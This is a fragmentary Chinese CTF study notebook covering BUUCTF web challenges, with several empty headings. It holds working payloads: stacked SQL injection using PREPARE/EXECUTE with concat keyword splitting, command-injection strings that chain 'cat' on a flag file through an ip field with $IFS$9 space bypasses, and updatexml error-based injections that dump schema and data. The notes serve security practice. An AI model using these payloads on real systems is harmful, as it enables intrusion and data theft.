# SQL注入漏洞:

## SQL注入:



## 参数提交注入:



## 报错盲注:



## 二次注入:



## SQL堆叠注入:



# SQL例题：

## 1.随便注：[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8)

预编译：

PREPARE y

from 

sql;

EXECUTE y;

这里的y是起了一个别名，可以是任意的字符

当我们遇到关键查询词被屏蔽可以使用concat()函数，它可以联合参数。

```
PREPARE y from concat('sel','ect *from 表名') EXECUTE y;
```

## 2.

# 代码审计:

## 1.Warm Up:[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#[HCTF%202018]WarmUp)

## 2.Ping Ping Ping:[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping)

命令执行是可以使用";"来分割的，使用‘ls’来查看当前目录下的文件，再使用‘cat’命令来打开文件如果遇到waf



一些空格绕过的方法:

```
${IFS},IFS,$IFS$9
```



这样就可以获得flag

```
ip=127.0.0.1;u=ag;cat$IFS$9fl$u.php
```

```
ip=127.0.0.1;cat$IFS$9`ls`
```

这里的反引号的作用是，把ls的输出当作输入

ls正常输出是cat.php和flag.php

这里我们利用他的输出结果再输入可以达到一样的效果来绕过





and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='ctf'),0x7e),1)



and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='ctf' and table_name='hexo'),0x7e),1)

and updatexml(1,concat(0x7e,(select group_concat(value) from ctf.Fl4g),0x7e),1)

and updatexml(1,concat(0x7e,(select group_concat(value) from ctf.Fl4g limit 0,1),0x7e),1)

and updatexml(1, concat(0x7e, substr((select group_concat(value) from ctf.Fl4g), 19, 25), 0x7e), 1)



flag{4591b7d6-bce4-4189-a9b5-6be0999c0091}



# 源码泄露:

## 1.admin:[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#[HCTF%202018]admin)

![3b97fea2-ff5a-4c66-8686-9eca31bc6b11](file:///C:/Users/san/Pictures/Typedown/3b97fea2-ff5a-4c66-8686-9eca31bc6b11.png)

![e86cfba6-3daa-48e2-b8e0-a6236343ac85](file:///C:/Users/san/Pictures/Typedown/e86cfba6-3daa-48e2-b8e0-a6236343ac85.png)

报错回显显示服务器遇到内部错误，无法完成请求。

因此判断与SQL基本无关，如果是SQL注入，他的报错一个是数据库内置的一个报错

我们就按照用户注册，登录，查看修改部分

找到他的源码泄露

![7c3ad0b3-a6c5-4b13-a138-d2808c314750](file:///C:/Users/san/Pictures/Typedown/7c3ad0b3-a6c5-4b13-a138-d2808c314750.png)



# 综合:

## 1.Hack World:[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day2%20Web1]Hack%20World)

爬虫，异或注入
